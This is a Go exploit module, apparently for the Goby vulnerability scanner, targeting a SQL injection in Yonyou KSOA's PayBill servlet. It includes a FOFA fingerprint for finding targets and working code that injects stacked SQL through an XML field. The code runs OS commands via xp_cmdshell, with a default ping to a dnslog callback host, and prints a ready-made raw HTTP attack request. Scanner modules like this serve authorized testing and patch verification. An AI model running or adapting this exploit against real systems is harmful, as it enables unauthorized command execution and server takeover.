package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"math/rand"
	"strconv"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Yongyou KSOA PayBill SQL Injection Vulnerability",
    "Description": "<p>UFIDA KSOA is a new-generation product developed under the guidance of the SOA concept. It is a unified IT infrastructure launched according to the cutting-edge IT needs of distribution companies. It allows IT systems established in various periods of distribution companies to easily communicate with each other.</p><p>There is a sql injection vulnerability in UFIDA KSOA PayBill, attackers can execute arbitrary commands through xp_cmdshell to obtain server privileges.</p>",
    "Product": "yonyou-Time-and-Space-KSOA",
    "Homepage": "https://www.yonyou.com/",
    "DisclosureDate": "2023-02-27",
    "Author": "h1ei1",
    "FofaQuery": "body=\"onmouseout=\\\"this.classname='btn btnOff'\\\"\"",
    "GobyQuery": "body=\"onmouseout=\\\"this.classname='btn btnOff'\\\"\"",
    "Level": "3",
    "Impact": "<p>There is a sql injection vulnerability in UFIDA-Timespace KSOA PayBill, attackers can execute arbitrary commands through xp_cmdshell to obtain server privileges.</p>",
    "Recommendation": "<p>At present, the manufacturer has released security patches, please update in time: <a href=\"https://www.yonyou.com/.\">https://www.yonyou.com/.</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "sql,cmd,sqlPoint",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "ping xxx.dnslog.cn",
            "show": "attackType=cmd"
        },
        {
            "name": "sql",
            "type": "input",
            "value": "WAITFOR DELAY '00:00:03';",
            "show": "attackType=sql"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.0",
    "Translation": {
        "CN": {
            "Name": "用友时空 KSOA PayBill 文件 name 参数 SQL 注入漏洞",
            "Product": "用友-时空KSOA",
            "Description": "<p>用友时空 KSOA 是建立在 SOA 理念指导下研发的新一代产品，是根据流通企业前沿的 IT 需求推出的统一的IT基础架构，它可以让流通企业各个时期建立的 IT 系统之间彼此轻松对话。</p><p>用友时空 KSOA PayBill 存在 sql 注入漏洞，攻击者可通过 xp_cmdshell 执行任意命令获取服务器权限。</p>",
            "Recommendation": "<p>1、目前厂商已发布安全补丁，请及时更新：<a href=\"https://www.yonyou.com/\">https://www.yonyou.com/</a>。</p><p>2、部署 Web 应用防火墙，对数据库操作进行监控。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>用友-时空 KSOA PayBill 存在 sql 注入漏洞，攻击者可通过 xp_cmdshell 执行任意命令获取服务器权限。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Yongyou KSOA PayBill SQL Injection Vulnerability",
            "Product": "yonyou-Time-and-Space-KSOA",
            "Description": "<p>UFIDA KSOA is a new-generation product developed under the guidance of the SOA concept. It is a unified IT infrastructure launched according to the cutting-edge IT needs of distribution companies. It allows IT systems established in various periods of distribution companies to easily communicate with each other.</p><p>There is a sql injection vulnerability in UFIDA KSOA PayBill, attackers can execute arbitrary commands through xp_cmdshell to obtain server privileges.</p>",
            "Recommendation": "<p>At present, the manufacturer has released security patches, please update in time: <a href=\"https://www.yonyou.com/.\">https://www.yonyou.com/.</a><br></p>",
            "Impact": "<p>There is a sql injection vulnerability in UFIDA-Timespace KSOA PayBill, attackers can execute arbitrary commands through xp_cmdshell to obtain server privileges.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2023-08-09",
    "PocId": "10818"
}`

	sendRequestUIOWEUJPO := func(payload string, u *httpclient.FixUrl) bool {
		randName := 100000 + rand.Intn(10000)
		cfg := httpclient.NewPostRequestConfig("/servlet/PayBill?caculate&_rnd=")
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		cfg.Data = fmt.Sprintf("<?xml version=\"1.0\" encoding=\"UTF-8\" ?><root><name>1</name><name>1';%s;--</name><name>1</name><name>%d</name></root>", payload, randName)
		resp, err := httpclient.DoHttpRequest(u, cfg)
		if err != nil {
			return false
		}
		return resp.StatusCode == 200 && strings.Contains(resp.RawBody, "<errmsg>") && strings.Contains(resp.RawBody, strconv.Itoa(randName))
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			return sendRequestUIOWEUJPO("select @@version", u)
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			if ss.Params["attackType"] == "sql" {
				if sendRequestUIOWEUJPO(ss.Params["sql"].(string), expResult.HostInfo) {
					expResult.Success = true
					expResult.Output = "盲注漏洞，执行成功"
				}
			} else if ss.Params["attackType"] == "cmd" {
				if !sendRequestUIOWEUJPO("exec sp_configure 'show advanced options'", expResult.HostInfo) {
					return expResult
				}
				if sendRequestUIOWEUJPO(fmt.Sprintf("exec master..xp_cmdshell '%s'", ss.Params["cmd"].(string)), expResult.HostInfo) {
					expResult.Success = true
					expResult.Output = "命令执行成功"
				}
			} else if ss.Params["attackType"] == "sqlPoint" {
				expResult.Success = true
				expResult.OutputType = "html"
				expResult.Output = `
POST /servlet/PayBill?caculate&_rnd= HTTP/1.1
<br>Host: ` + expResult.HostInfo.HostInfo + `
<br>User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
<br>Content-Length: 113
<br>Accept-Encoding: gzip, deflate
<br>Connection: close

<br><br><?xml version="1.0" encoding="UTF-8" ?><root><name>1</name><name>1'Your Payload;--</name><name>1</name><name>102614</name></root>
`
			}
			return expResult
		},
	))
}

